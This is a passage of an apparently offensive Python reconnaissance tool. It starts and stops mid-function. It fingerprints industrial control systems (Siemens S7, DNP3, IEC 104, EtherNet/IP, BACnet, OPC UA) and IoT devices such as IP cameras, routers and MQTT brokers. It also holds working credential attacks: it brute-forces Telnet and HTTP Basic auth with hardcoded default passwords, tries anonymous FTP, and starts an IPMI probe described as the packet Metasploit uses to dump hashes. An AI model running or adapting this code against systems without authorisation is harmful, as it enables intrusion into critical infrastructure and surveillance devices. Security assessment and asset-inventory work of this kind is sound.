                    if r1 and len(r1) > 9 and r1[7] == 0x01:
                        n_bytes = r1[8]
                        coil_bytes = r1[9:9 + n_bytes]
                        coils = []
                        for b in coil_bytes:
                            for bit in range(8):
                                coils.append((b >> bit) & 1)
                        result['coils'] = coils[:16]
            except Exception:
                pass

            return result
        except Exception:
            s.close()
            return None

    # ── IEC 60870-5-104 — port 2404 ──────────────────────────────────────────

    def probe_iec104(self, ip):
        s = self._tcp(ip, 2404)
        if not s:
            return None
        try:
            s.sendall(b'\x68\x04\x07\x00\x00\x00')  # STARTDT_ACT
            resp = s.recv(64)
            s.close()
            if resp and len(resp) >= 6 and resp[0] == 0x68:
                result = {'protocol': 'IEC 60870-5-104', 'port': 2404}
                if resp[2] == 0x0B:
                    result['response'] = 'STARTDT_CON'
                else:
                    result['response'] = f'APCI control=0x{resp[2]:02X}'
                return result
        except Exception:
            s.close()
        return None

    # ── Siemens S7 — port 102 ────────────────────────────────────────────────

    def probe_s7(self, ip):
        s = self._tcp(ip, 102)
        if not s:
            return None
        try:
            # TPKT + COTP Connection Request
            cotp_cr = (
                b'\x03\x00\x00\x16'  # TPKT header (length=22)
                b'\x11\xe0'          # COTP length + Connect Request
                b'\x00\x00\x00\x01\x00'  # dst-ref, src-ref, class
                b'\xc0\x01\x0a'      # TPDU size param
                b'\xc1\x02\x01\x00'  # src-TSAP
                b'\xc2\x02\x01\x02'  # dst-TSAP (S7 CPU rack 0, slot 2)
            )
            s.sendall(cotp_cr)
            resp = s.recv(64)
            if not resp or len(resp) < 5 or resp[5] != 0xD0:  # 0xD0 = CC (Connect Confirm)
                s.close()
                return None
            # S7 Communication Setup (negotiate PDU size)
            s7_setup = (
                b'\x03\x00\x00\x19'   # TPKT
                b'\x02\xf0\x80'       # COTP DT (Data Transfer)
                b'\x32\x01\x00\x00'   # S7 protocol id + ROSCTR=JOB
                b'\x00\x00\x00\x08'   # PDU ref, param length
                b'\x00\x00'           # data length
                b'\xf0\x00'           # Function: Setup Communication
                b'\x00\x01\x00\x01'   # max ack / max jobs
                b'\x03\xc0'           # PDU size 960
            )
            s.sendall(s7_setup)
            resp2 = s.recv(64)
            s.close()
            if resp2 and len(resp2) >= 7:
                result = {'protocol': 'Siemens S7', 'port': 102}
                # Extract any readable ASCII strings (module name, etc.)
                parts = re.findall(b'[ -~]{4,}', resp2)
                info_strs = [p.decode('ascii', errors='replace').strip()
                             for p in parts if p.strip()]
                if info_strs:
                    result['info'] = info_strs[:4]
                return result
        except Exception:
            s.close()
        return None

    # ── EtherNet/IP (CIP) — port 44818 ───────────────────────────────────────

    def probe_enip(self, ip):
        s = self._tcp(ip, 44818)
        if not s:
            return None
        try:
            # List Identity encapsulation command (0x0065), all zeros header
            list_id = (
                b'\x65\x00'          # Command: List Identity
                b'\x00\x00'          # Length: 0
                b'\x00\x00\x00\x00'  # Session handle
                b'\x00\x00\x00\x00'  # Status
                b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Sender context (8 bytes)
                b'\x00\x00\x00\x00'  # Options
            )
            s.sendall(list_id)
            resp = s.recv(1024)
            s.close()
            if not resp or len(resp) < 4:
                return None
            cmd = struct.unpack_from('<H', resp, 0)[0]
            if cmd != 0x0065:
                return None
            result = {'protocol': 'EtherNet/IP (CIP)', 'port': 44818}
            # Identity item starts after 24-byte encap header + 4 bytes item list header
            try:
                offset = 28  # encap(24) + item_count(2) + item_type(2)
                # skip item length (2)
                offset += 2
                # encap_version(2) + socket_addr(16) = 18 bytes
                offset += 18
                if offset + 8 <= len(resp):
                    vendor_id   = struct.unpack_from('<H', resp, offset)[0]
                    device_type = struct.unpack_from('<H', resp, offset + 2)[0]
                    result['vendor_id']   = f'0x{vendor_id:04X}'
                    result['device_type'] = f'0x{device_type:04X}'
                    # product name
                    name_len_off = offset + 14
                    if name_len_off < len(resp):
                        name_len = resp[name_len_off]
                        raw_name = resp[name_len_off + 1: name_len_off + 1 + name_len]
                        result['product_name'] = raw_name.decode('utf-8', errors='replace').strip()
            except Exception:
                pass
            return result
        except Exception:
            s.close()
        return None

    # ── BACnet/IP — port 47808 UDP ────────────────────────────────────────────

    def probe_bacnet(self, ip):
        # BVLC + NPDU + APDU WhoIs (unicast)
        whois = (
            b'\x81\x0a\x00\x08'  # BVLC: Original-Unicast-NPDU, length=8
            b'\x01\x04'          # NPDU: version=1, control=expecting-reply
            b'\x10\x08'          # APDU: unconfirmed-req / WhoIs
        )
        resp = self._udp(ip, 47808, whois)
        if resp and len(resp) >= 4 and resp[0] == 0x81:
            result = {'protocol': 'BACnet/IP', 'port': 47808}
            if len(resp) > 9:
                apdu_type = resp[8] >> 4 if len(resp) > 8 else 0
                svc = resp[9] if len(resp) > 9 else 0
                result['apdu_type'] = apdu_type
                result['service']   = svc
                if svc == 0x00:
                    result['response'] = 'I-Am'
            return result
        return None

    # ── DNP3 — port 20000 ────────────────────────────────────────────────────

    def probe_dnp3(self, ip):
        s = self._tcp(ip, 20000)
        if not s:
            return None
        try:
            # DNP3 Link Layer: REQUEST_LINK_STATES (simplified — no CRC computed)
            dnp3_req = b'\x05\x64\x05\xc0\x01\x00\x00\x00\x00\x00'
            s.sendall(dnp3_req)
            resp = s.recv(64)
            s.close()
            if resp and len(resp) >= 2:
                result = {'protocol': 'DNP3', 'port': 20000}
                if resp[0] == 0x05 and resp[1] == 0x64:
                    result['response'] = 'DNP3 link frame'
                else:
                    result['response'] = f'bytes: {resp[:8].hex()}'
                return result
        except Exception:
            s.close()
        return None

    # ── OPC UA — port 4840 ───────────────────────────────────────────────────

    def probe_opc_ua(self, ip):
        s = self._tcp(ip, 4840)
        if not s:
            return None
        try:
            # OPC UA Hello message
            hello = (
                b'HEL'
                b'F'            # message type: HEL, chunk type: F (final)
                b'\x20\x00\x00\x00'  # total message size = 32
                b'\x00\x00\x00\x00'  # protocol version
                b'\x00\x00\x80\x00'  # receive buffer size
                b'\x00\x00\x80\x00'  # send buffer size
                b'\x00\x00\x40\x00'  # max message size
                b'\x00\x00\x00\x00'  # max chunk count
                b'\x00\x00\x00\x00'  # endpoint URL length (empty)
            )
            s.sendall(hello)
            resp = s.recv(256)
            s.close()
            if resp and len(resp) >= 4 and resp[:3] == b'ACK':
                return {'protocol': 'OPC UA', 'port': 4840, 'response': 'ACK'}
            if resp and len(resp) >= 4 and resp[:3] == b'ERR':
                reason = resp[8:].decode('utf-8', errors='replace')[:80]
                return {'protocol': 'OPC UA', 'port': 4840, 'response': f'ERR: {reason}'}
        except Exception:
            s.close()
        return None

    # ── MQTT — port 1883 / 8883 ───────────────────────────────────────────────

    def probe_mqtt(self, ip, port=1883):
        s = self._tcp(ip, port)
        if not s:
            return None
        try:
            # MQTT CONNECT (protocol v3.1.1)
            client_id = b'recon_probe'
            vh = (
                b'\x00\x04MQTT'  # protocol name
                b'\x04'          # protocol level 3.1.1
                b'\x02'          # connect flags: clean session
                b'\x00\x1e'      # keep-alive: 30s
            )
            payload = struct.pack('>H', len(client_id)) + client_id
            remain = vh + payload
            pkt = b'\x10' + bytes([len(remain)]) + remain
            s.sendall(pkt)
            resp = s.recv(16)
            s.close()
            if resp and len(resp) >= 4 and resp[0] == 0x20 and resp[1] == 0x02:
                rc = resp[3]
                codes = {
                    0: 'Connection Accepted (open broker!)',
                    1: 'Refused — bad protocol version',
                    2: 'Refused — identifier rejected',
                    3: 'Refused — server unavailable',
                    4: 'Refused — bad credentials',
                    5: 'Refused — not authorized',
                }
                return {
                    'protocol':     'MQTT' if port == 1883 else 'MQTT/SSL',
                    'port':         port,
                    'connack':      codes.get(rc, f'code {rc}'),
                    'open_broker':  rc == 0,
                }
        except Exception:
            s.close()
        return None

    # ── UPnP / SSDP — port 1900 UDP ──────────────────────────────────────────

    def probe_upnp(self, ip):
        msearch = (
            b'M-SEARCH * HTTP/1.1\r\n'
            b'HOST: 239.255.255.250:1900\r\n'
            b'MAN: "ssdp:discover"\r\n'
            b'MX: 1\r\n'
            b'ST: ssdp:all\r\n'
            b'\r\n'
        )
        resp = self._udp(ip, 1900, msearch, 2048)
        if not resp:
            return None
        result = {'protocol': 'UPnP/SSDP', 'port': 1900}
        text = resp.decode('utf-8', errors='replace')
        location = None
        for field in ('SERVER', 'LOCATION', 'USN', 'ST'):
            m = re.search(rf'{field}:\s*(.+)', text, re.IGNORECASE)
            if m:
                val = m.group(1).strip()
                result[field.lower()] = val
                if field == 'LOCATION':
                    location = val
        # Fetch the description XML for richer device info
        if location:
            desc = self._fetch_upnp_desc(location)
            if desc:
                result['description'] = desc
        return result

    # ── CoAP — port 5683 UDP ─────────────────────────────────────────────────

    def probe_coap(self, ip):
        # CON GET /.well-known/core
        # Header byte1: Ver=1 T=0(CON) TKL=0  -> 0x40
        # Code: 1 (GET)  -> 0x01
        # Message ID: 0x0001
        # Uri-Path option for ".well-known" (len=11, delta=11)
        # Then Uri-Path for "core" (len=4, delta=0)
        coap_req = (
            b'\x40\x01\x00\x01'       # header
            b'\xBB.well-known'         # option: uri-path delta=11, len=11
            b'\x04core'               # option: uri-path delta=0, len=4
        )
        resp = self._udp(ip, 5683, coap_req, 1024)
        if resp and len(resp) >= 4:
            ver = (resp[0] >> 6) & 0x3
            if ver == 1:
                code_byte = resp[1]
                code_str = f'{code_byte >> 5}.{code_byte & 0x1f:02d}'
                result = {'protocol': 'CoAP', 'port': 5683, 'code': code_str}
                if len(resp) > 4:
                    result['payload'] = resp[4:204].decode('utf-8', errors='replace')
                return result
        return None

    # ── RTSP — port 554 ──────────────────────────────────────────────────────

    def probe_rtsp(self, ip, port=554):
        s = self._tcp(ip, port)
        if not s:
            return None
        try:
            req = (
                f'OPTIONS rtsp://{ip}/ RTSP/1.0\r\n'
                f'CSeq: 1\r\n'
                f'User-Agent: recon_probe\r\n'
                f'\r\n'
            ).encode()
            s.sendall(req)
            resp = s.recv(1024)
            s.close()
            if not resp:
                return None
            text = resp.decode('utf-8', errors='replace')
            if 'RTSP/' not in text:
                return None
            result = {'protocol': 'RTSP', 'port': port}
            m = re.match(r'RTSP/[\d.]+ (\d+) (.+)', text)
            if m:
                result['status'] = f'{m.group(1)} {m.group(2).strip()}'
            m = re.search(r'Server:\s*(.+)', text, re.IGNORECASE)
            if m:
                result['server'] = m.group(1).strip()
            m = re.search(r'Public:\s*(.+)', text, re.IGNORECASE)
            if m:
                result['methods'] = m.group(1).strip()
            return result
        except Exception:
            s.close()
        return None

    # ── HTTP banner grab ──────────────────────────────────────────────────────

    def probe_http(self, ip, port=80):
        s = self._tcp(ip, port)
        if not s:
            return None
        try:
            req = (
                f'GET / HTTP/1.0\r\n'
                f'Host: {ip}\r\n'
                f'Connection: close\r\n'
                f'\r\n'
            ).encode()
            s.sendall(req)
            resp = s.recv(2048)
            s.close()
            if not resp:
                return None
            text = resp.decode('utf-8', errors='replace')
            result = {'protocol': 'HTTP', 'port': port}
            m = re.match(r'HTTP/[\d.]+ (\d+)', text)
            if m:
                result['status'] = m.group(1)
            m = re.search(r'Server:\s*(.+)', text, re.IGNORECASE)
            if m:
                result['server'] = m.group(1).strip()
            # Try to grab page title
            m = re.search(r'<title[^>]*>([^<]{1,100})</title>', text, re.IGNORECASE)
            if m:
                result['title'] = m.group(1).strip()
            return result
        except Exception:
            s.close()
        return None

    # ── SNMP v2c — UDP 161 ───────────────────────────────────────────────────

    def probe_snmp(self, ip, community='public'):
        """
        SNMP v2c GET for sysDescr, sysName, sysLocation, sysContact.
        Pure-Python BER packet — no external library needed.
        Works on routers, cameras, IoT hubs, PLCs, switches.
        """
        # Pre-encoded OID values for the four system MIBs (1.3.6.1.2.1.1.x.0)
        # BER: tag=0x06, len=0x08, value=2B 06 01 02 01 01 XX 00
        def _oid(last): return b'\x06\x08\x2b\x06\x01\x02\x01\x01' + bytes([last]) + b'\x00'
        def _varbind(oid): return b'\x30' + bytes([len(oid) + 2]) + oid + b'\x05\x00'

        oid_map = {
            'sysDescr':    _oid(0x01),
            'sysName':     _oid(0x05),
            'sysLocation': _oid(0x06),
            'sysContact':  _oid(0x04),
        }
        varbinds  = b''.join(_varbind(v) for v in oid_map.values())
        vbl       = b'\x30' + bytes([len(varbinds)]) + varbinds
        comm      = community.encode()
        pdu_inner = b'\x02\x04\x00\x00\x00\x01' + b'\x02\x01\x00' * 2 + vbl
        pdu       = b'\xa0' + bytes([len(pdu_inner)]) + pdu_inner
        msg_inner = b'\x02\x01\x01' + b'\x04' + bytes([len(comm)]) + comm + pdu
        packet    = b'\x30' + bytes([len(msg_inner)]) + msg_inner

        resp = self._udp(ip, 161, packet, 2048)
        if not resp or len(resp) < 10 or resp[0] != 0x30:
            return None

        result = {'protocol': 'SNMP', 'port': 161, 'community': community}

        # Walk the response bytes and pull out OCTET STRING values after each OID
        # Strategy: find each known OID bytes in response, then parse the next TLV
        raw = resp
        oid_names = list(oid_map.keys())
        oid_vals  = list(oid_map.values())

        def _ber_string(data, pos):
            """Parse OCTET STRING / IA5String / PrintableString at pos."""
            if pos >= len(data):
                return None, pos
            tag = data[pos]
            if tag not in (0x04, 0x13, 0x16):
                return None, pos
            pos += 1
            if data[pos] & 0x80:
                n = data[pos] & 0x7F
                length = int.from_bytes(data[pos+1:pos+1+n], 'big')
                pos += 1 + n
            else:
                length = data[pos]; pos += 1
            val = data[pos:pos+length].decode('utf-8', errors='replace').strip()
            return val, pos + length

        for name, oid_bytes in zip(oid_names, oid_vals):
            needle = oid_bytes  # the raw OID bytes (with tag+len prefix)
            idx = raw.find(needle)
            if idx == -1:
                continue
            # Skip past the OID TLV to find the value TLV
            after_oid = idx + len(needle)
            val, _ = _ber_string(raw, after_oid)
            if val and val.strip('\x00'):
                result[name] = val[:200]

        return result if len(result) > 3 else None  # only return if we got actual data

    # ── SSH banner — port 22 ─────────────────────────────────────────────────

    def probe_ssh(self, ip):
        """Grab SSH version banner — reveals OS, device type, firmware hints."""
        s = self._tcp(ip, 22)
        if not s:
            return None
        try:
            banner = s.recv(256)
            s.close()
            if not banner or not banner.startswith(b'SSH-'):
                return None
            text = banner.decode('utf-8', errors='replace').strip()
            result = {'protocol': 'SSH', 'port': 22, 'banner': text}
            # Parse: SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6
            m = re.match(r'SSH-([\d.]+)-(\S+)', text)
            if m:
                result['version']    = m.group(1)
                result['software']   = m.group(2)
                # Known device hints from SSH software string
                sw = m.group(2).lower()
                if 'dropbear' in sw:
                    result['hint'] = 'Dropbear SSH — embedded Linux (router/IoT)'
                elif 'cisco' in sw:
                    result['hint'] = 'Cisco IOS/NX-OS'
                elif 'mikrotik' in sw or 'routeros' in sw:
                    result['hint'] = 'MikroTik RouterOS'
                elif 'lancom' in sw:
                    result['hint'] = 'LANCOM device'
                elif 'axis' in sw:
                    result['hint'] = 'Axis IP camera'
            return result
        except Exception:
            s.close()
        return None

    # ── ONVIF — IP Camera WS-Discovery / GetDeviceInformation ────────────────

    def probe_onvif(self, ip, port=80):
        """
        Send ONVIF SOAP GetDeviceInformation request.
        Returns manufacturer, model, firmware, serial for IP cameras.
        Tries /onvif/device_service and /onvif/device (common paths).
        """
        soap = (
            '<?xml version="1.0" encoding="utf-8"?>'
            '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"'
            ' xmlns:tds="http://www.onvif.org/ver10/device/wsdl">'
            '<s:Body><tds:GetDeviceInformation/></s:Body>'
            '</s:Envelope>'
        )
        for path in ('/onvif/device_service', '/onvif/device', '/onvif/devices'):
            try:
                s = self._tcp(ip, port)
                if not s:
                    continue
                req = (
                    f'POST {path} HTTP/1.0\r\n'
                    f'Host: {ip}:{port}\r\n'
                    f'Content-Type: application/soap+xml; charset=utf-8\r\n'
                    f'Content-Length: {len(soap)}\r\n'
                    f'Connection: close\r\n'
                    f'\r\n'
                    f'{soap}'
                ).encode()
                s.sendall(req)
                resp = b''
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                    if len(resp) > 16384:
                        break
                s.close()
                if not resp or b'GetDeviceInformationResponse' not in resp:
                    continue
                text = resp.decode('utf-8', errors='replace')
                result = {'protocol': 'ONVIF', 'port': port, 'path': path}
                for tag in ('Manufacturer', 'Model', 'FirmwareVersion',
                            'SerialNumber', 'HardwareId'):
                    m = re.search(rf'<(?:[^:>]+:)?{tag}>([^<]+)<', text, re.IGNORECASE)
                    if m:
                        result[tag.lower()] = m.group(1).strip()
                return result
            except Exception:
                pass
        return None

    # ── HTTP deep fingerprint — camera / SCADA / IoT specific URLs ───────────

    def probe_http_fingerprint(self, ip, port=80):
        """
        Check device-specific HTTP endpoints concurrently to extract
        model/firmware/type.  All vendor checks fire at the same time —
        total time = slowest single request, NOT the sum of all requests.
        Covers: Hikvision, Dahua, Axis, generic DVR, Siemens, Schneider,
                Rockwell, and generic auth-realm / header extraction.
        """
        result = {'protocol': 'HTTP-Fingerprint', 'port': port}

        def _get(path):
            try:
                s = self._tcp(ip, port)
                if not s:
                    return None
                req = (
                    f'GET {path} HTTP/1.0\r\n'
                    f'Host: {ip}:{port}\r\n'
                    f'Connection: close\r\n\r\n'
                ).encode()
                s.sendall(req)
                data = b''
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    if len(data) > 32768:
                        break
                s.close()
                return data.decode('utf-8', errors='replace') if data else None
            except Exception:
                return None

        # ── Each vendor check is an independent function (runs concurrently) ──

        def check_hikvision():
            body = _get('/ISAPI/System/deviceInfo')
            if not body or 'DeviceInfo' not in body:
                return None
            r = {'vendor': 'Hikvision'}
            for tag in ('deviceName', 'deviceID', 'model', 'serialNumber',
                        'firmwareVersion', 'encoderVersion', 'macAddress'):
                m = re.search(rf'<{tag}>([^<]+)<', body, re.IGNORECASE)
                if m:
                    r[tag] = m.group(1).strip()
            return r

        def check_dahua():
            body = _get('/cgi-bin/magicBox.cgi?action=getDeviceType')
            r = {}
            # Real Dahua API returns plain text like "type=IPC-HDW1234"
            # Skip if response is an HTML page (login redirect)
            if body and '<html' not in body.lower() and 'DeviceType' in body or (
                    body and '<html' not in body.lower() and 'type=' in body.lower()):
                r['vendor'] = 'Dahua'
                # Restrict to short alphanumeric device type — avoids capturing HTML
                m = re.search(r'type=([A-Za-z0-9_\-\.]{1,60})', body, re.IGNORECASE)
                if m:
                    r['device_type'] = m.group(1).strip()
            if not r:
                body2 = _get('/cgi-bin/magicBox.cgi?action=getSoftwareVersion')
                if body2 and '<html' not in body2.lower() and 'version=' in body2.lower():
                    r['vendor'] = 'Dahua'
                    m = re.search(r'version=([A-Za-z0-9_\-\.]{1,60})', body2, re.IGNORECASE)
                    if m:
                        r['firmware'] = m.group(1).strip()
            return r or None

        def check_axis():
            body = _get('/axis-cgi/param.cgi?action=list&group=root.Brand,'
                        'root.Properties.Firmware')
            if not body or 'ProdFullName' not in body:
                return None
            r = {'vendor': 'Axis Communications'}
            for key in ('ProdFullName', 'ProdNbr', 'ProdShortName',
                        'Version', 'BuildDate'):
                m = re.search(rf'root\.\w+\.{key}=(.+)', body, re.IGNORECASE)
                if m:
                    r[key.lower()] = m.group(1).strip()
            return r

        def check_dvr():
            body = _get('/device.rsp?opt=sys&cmd=getstatus')
            if not body or ('DevSN' not in body and 'devtype' not in body.lower()):
                return None
            r = {'vendor': 'Generic DVR/NVR'}
            for key in ('DevSN', 'devtype', 'HardVersion', 'SoftVersion'):
                m = re.search(rf'"{key}"\s*:\s*"([^"]+)"', body, re.IGNORECASE)
                if m:
                    r[key.lower()] = m.group(1).strip()
            return r

        def check_siemens():
            body = _get('/api/hmipanel') or _get('/Portal/Portal.mwsl')
            if not body or not any(k in body for k in ('Siemens', 'SIMATIC', 'WinCC')):
                return None
            r = {'vendor': 'Siemens HMI/SCADA'}
            m = re.search(r'(SIMATIC|WinCC|HMI\s*Panel)[^<"]{0,80}', body)
            if m:
                r['product'] = m.group(0).strip()[:100]
            return r

        def check_schneider():
            body = _get('/index.htm')
            if not body or not any(k in body for k in
                                   ('Schneider', 'EcoStruxure', 'Modicon')):
                return None
            r = {'vendor': 'Schneider Electric'}
            m = re.search(r'(Modicon|EcoStruxure|Quantum|Premium|M340)[^<"]{0,60}',
                          body, re.IGNORECASE)
            if m:
                r['product'] = m.group(0).strip()[:100]
            return r

        def check_rockwell():
            body = _get('/')
            if not body or not any(k in body for k in
                                   ('Allen-Bradley', 'Rockwell', 'FactoryTalk',
                                    'CompactLogix')):
                return None
            return {'vendor': 'Rockwell Automation'}

        def check_generic():
            body = _get('/')
            if not body:
                return None
            r = {}
            m = re.search(r'WWW-Authenticate:[^\r\n]*realm="([^"]{3,80})"',
                          body, re.IGNORECASE)
            if m:
                r['auth_realm'] = m.group(1).strip()
            for hdr in ('X-Powered-By', 'X-Generator', 'X-Device-Name'):
                m = re.search(rf'{hdr}:\s*(.+)', body, re.IGNORECASE)
                if m:
                    r[hdr.lower().replace('-', '_')] = m.group(1).strip()[:100]
            return r or None

        # ── Run all checks concurrently ───────────────────────────────────────
        checks = [check_hikvision, check_dahua, check_axis, check_dvr,
                  check_siemens, check_schneider, check_rockwell, check_generic]

        found = False
        with ThreadPoolExecutor(max_workers=len(checks)) as pool:
            futs = {pool.submit(fn): fn.__name__ for fn in checks}
            for fut in as_completed(futs):
                r = fut.result()
                if r:
                    result.update(r)
                    found = True

        return result if found else None

    # ── UPnP description XML fetch ────────────────────────────────────────────

    def _fetch_upnp_desc(self, location_url: str) -> dict:
        """
        Fetch and parse the UPnP device description XML from the LOCATION URL.
        Returns dict with friendlyName, manufacturer, modelName, modelNumber, etc.
        """
        result = {}
        try:
            # Parse host/port/path from URL manually (no urllib needed)
            m = re.match(r'https?://([^:/]+)(?::(\d+))?(/.+)?', location_url)
            if not m:
                return result
            host = m.group(1)
            port = int(m.group(2)) if m.group(2) else 80
            path = m.group(3) or '/'
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((host, port))
            req = (f'GET {path} HTTP/1.0\r\nHost: {host}:{port}\r\n'
                   f'Connection: close\r\n\r\n').encode()
            s.sendall(req)
            resp = b''
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
                if len(resp) > 65536:
                    break
            s.close()
            text = resp.decode('utf-8', errors='replace')
            for tag in ('friendlyName', 'manufacturer', 'manufacturerURL',
                        'modelDescription', 'modelName', 'modelNumber',
                        'modelURL', 'serialNumber', 'UDN'):
                mm = re.search(rf'<{tag}>([^<]+)<', text, re.IGNORECASE)
                if mm:
                    result[tag] = mm.group(1).strip()
        except Exception:
            pass
        return result

    # ── SMB — port 445 ───────────────────────────────────────────────────────

    def probe_smb(self, ip: str) -> dict | None:
        """
        Send SMBv1 Negotiate to port 445.
        If the server responds with SMB2/3 downgrade, parse SecurityMode.
        Returns signing info and SMB dialect, or None if port is not SMB.
        """
        # SMBv1 Negotiate Protocol Request (compatible with all SMB servers)
        # Total: 4 (NBT) + 32 (SMB1 hdr) + 3 (params) + 14 (data) = 53 bytes
        # NBT length field = 53 - 4 = 49 = 0x31
        pkt = (
            b'\x00\x00\x00\x31'            # NBT session message, len=49
            b'\xff\x53\x4d\x42'            # \xffSMB magic
            b'\x72'                        # Command: Negotiate (0x72)
            b'\x00\x00\x00\x00'            # Status
            b'\x18'                        # Flags
            b'\x01\x28'                    # Flags2
            b'\x00\x00'                    # PIDHigh
            b'\x00\x00\x00\x00\x00\x00\x00\x00'  # SecuritySignature
            b'\x00\x00'                    # Reserved
            b'\x00\x00'                    # TreeID
            b'\x01\x00'                    # PID
            b'\x00\x00'                    # UID
            b'\x00\x00'                    # MID
            b'\x00'                        # WordCount = 0
            b'\x0e\x00'                    # ByteCount = 14
            b'\x02NT LM 0.12\x00'          # dialect string (12 bytes incl. null)
            b'\x02SMB 2.002\x00'           # SMB2 dialect hint (11 bytes)
        )
        s = self._tcp(ip, 445)
        if not s:
            return None
        try:
            s.sendall(pkt)
            resp = s.recv(512)
            s.close()
            if not resp or len(resp) < 9:
                return None

            result = {'protocol': 'SMB', 'port': 445}

            # SMB2/3 response — server upgraded: \xfeSMB
            smb2_idx = resp.find(b'\xfeSMB')
            if smb2_idx >= 0:
                result['smb_version'] = 'SMB2/3'
                # SecurityMode is at body offset 2 (after StructureSize 2 bytes)
                # Body starts at smb2_idx + 64 (SMB2 header is 64 bytes)
                body_off = smb2_idx + 64
                if len(resp) > body_off + 3:
                    sec = struct.unpack_from('<H', resp, body_off + 2)[0]
                    if sec & 0x02:
                        result['signing'] = 'required'
                    elif sec & 0x01:
                        result['signing'] = 'supported'
                    else:
                        result['signing'] = 'disabled'
                return result

            # SMB1 response — \xffSMB at offset 4
            if len(resp) >= 9 and resp[4:8] == b'\xff\x53\x4d\x42':
                result['smb_version'] = 'SMB1'
                flags2 = struct.unpack_from('<H', resp, 12)[0] if len(resp) >= 14 else 0
                result['signing'] = 'required' if (flags2 & 0x0010) else 'supported'
                return result

            return None
        except Exception:
            try:
                s.close()
            except Exception:
                pass
            return None

    # ── FTP anonymous login ───────────────────────────────────────────────────

    def probe_ftp_anon(self, ip):
        """Try anonymous FTP. Returns dict with 'anonymous' bool and 'banner'."""
        s = self._tcp(ip, 21)
        if not s:
            return None
        try:
            banner = s.recv(256).decode('utf-8', errors='replace').strip()[:200]
            s.sendall(b'USER anonymous\r\n')
            r1 = s.recv(256).decode('utf-8', errors='replace').strip()
            if not r1.startswith('331'):
                s.close()
                return {'protocol': 'FTP', 'port': 21, 'anonymous': False, 'banner': banner}
            s.sendall(b'PASS anonymous@\r\n')
            r2 = s.recv(256).decode('utf-8', errors='replace').strip()
            s.close()
            success = r2.startswith('230')
            return {
                'protocol': 'FTP',
                'port': 21,
                'anonymous': success,
                'banner': banner,
                'login_response': r2[:120],
            }
        except Exception:
            try:
                s.close()
            except Exception:
                pass
        return None

    # ── Telnet common credential check ────────────────────────────────────────

    def probe_telnet_creds(self, ip):
        """
        Try common Telnet credentials.
        Returns {'username': ..., 'password': ..., 'banner': ...} on success, else None.
        """
        TELNET_CREDS = [
            ('admin', 'admin'), ('admin', ''), ('root', 'root'), ('root', ''),
            ('admin', '1234'), ('admin', '12345'), ('admin', 'password'),
            ('user', 'user'), ('guest', 'guest'), ('admin', 'admin123'),
        ]

        def _read_until(s, keywords, timeout=3):
            s.settimeout(timeout)
            buf = b''
            deadline = time.time() + timeout
            while time.time() < deadline:
                try:
                    chunk = s.recv(256)
                    if not chunk:
                        break
                    # Strip IAC (Telnet option negotiation) sequences: FF XX XX
                    clean = re.sub(b'\xff[\xfb-\xfe].', b'', chunk)
                    buf += clean
                    text = buf.decode('utf-8', errors='replace').lower()
                    if any(kw in text for kw in keywords):
                        return buf
                except socket.timeout:
                    break
                except Exception:
                    break
            return buf

        for username, password in TELNET_CREDS:
            try:
                s = self._tcp(ip, 23)
                if not s:
                    return None
                banner_bytes = _read_until(s, ('login:', 'username:', 'user:'), 4)
                banner = banner_bytes.decode('utf-8', errors='replace').strip()[:200]
                s.sendall(username.encode() + b'\r\n')
                after_user = _read_until(s, ('password:', 'pass:'), 3)
                if b'pass' not in after_user.lower():
                    s.close()
                    continue
                s.sendall((password + '\r\n').encode())
                after_pass = _read_until(s, ('$', '#', '>', 'welcome', '~'), 4)
                resp = after_pass.decode('utf-8', errors='replace').lower()
                s.close()
                if any(p in resp for p in ('$', '#', '>', 'welcome', '/bin', 'busybox', 'shell')):
                    return {
                        'protocol': 'Telnet',
                        'port': 23,
                        'username': username,
                        'password': password,
                        'banner': banner,
                    }
            except Exception:
                try:
                    s.close()
                except Exception:
                    pass
        return None

    # ── HTTP default credential check ────────────────────────────────────────

    def probe_http_creds(self, ip, port=80):
        """
        Try common HTTP Basic auth credential pairs.
        Returns {'username': ..., 'password': ..., 'response': ...} on first hit, else None.
        """
        CREDS = [
            ('admin', 'admin'), ('admin', ''), ('admin', '1234'), ('admin', '12345'),
            ('admin', '123456'), ('admin', 'password'), ('admin', 'admin123'),
            ('admin', '888888'), ('admin', '666666'), ('root', 'root'), ('root', ''),
            ('user', 'user'), ('user', ''), ('guest', 'guest'),
            ('administrator', 'administrator'), ('supervisor', 'supervisor'),
        ]
        for username, password in CREDS:
            try:
                s = self._tcp(ip, port)
                if not s:
                    return None
                cred = base64.b64encode(f'{username}:{password}'.encode()).decode()
                req = (
                    f'GET / HTTP/1.0\r\n'
                    f'Host: {ip}:{port}\r\n'
                    f'Authorization: Basic {cred}\r\n'
                    f'Connection: close\r\n\r\n'
                ).encode()
                s.sendall(req)
                resp = s.recv(512)
                s.close()
                if resp:
                    first = resp.decode('utf-8', errors='replace').split('\r\n')[0]
                    if any(code in first for code in (' 200 ', ' 301 ', ' 302 ', ' 201 ')):
                        return {
                            'protocol': 'HTTP-BasicAuth',
                            'port': port,
                            'username': username,
                            'password': password,
                            'response': first[:120],
                        }
            except Exception:
                pass
        return None

    # ── Generic TCP banner grab ───────────────────────────────────────────────

    def grab_banner(self, ip, port):
        """Return a short human-readable banner string or None."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((ip, port))
            s.sendall(b'\r\n')
            data = s.recv(512)
            s.close()
            if not data:
                return None
            text = data.decode('utf-8', errors='replace').strip()
            for line in text.splitlines():
                line = line.strip()
                if len(line) > 3:
                    return line[:200]
        except Exception:
            pass
        return None

    # ── IPMI / RMCP ──────────────────────────────────────────────────────────

    def probe_ipmi(self, ip, port=623):
        """
        RMCP GetChannelAuthCaps — detect IPMI/BMC and check for cipher-0
        (anonymous auth). Cipher-0 allows hash extraction with no credentials.
        Packet is the same one used by Metasploit ipmi_dumphashes.
        """
        PKT = (
            b'\x06\x00\xff\x07'           # RMCP: version=6, reserved, seq=0xff, class=IPMI
